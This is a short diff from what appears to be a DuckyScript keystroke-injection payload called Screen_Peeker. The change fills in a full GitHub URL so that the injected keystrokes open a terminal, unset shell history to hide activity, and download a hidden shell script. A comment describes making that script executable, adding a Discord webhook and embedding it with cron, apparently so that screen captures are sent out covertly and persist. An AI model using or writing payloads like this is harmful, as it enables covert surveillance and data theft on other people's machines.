@@ -12,7 +12,7 @@ DELAY 1000
 REM Opening terminal, unsetting terminal history, and downloading .sp.sh shell script:
 CTRL ALT t
 DELAY 300
-STRINGLN unset HISTFILE && wget githubraw
+STRINGLN unset HISTFILE && wget https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Screen_Peeker/.sp.sh
 DELAY 1200
 
 REM: Granting execution permissions to .sp.sh, adding Discord webhook, and embedding with cron:
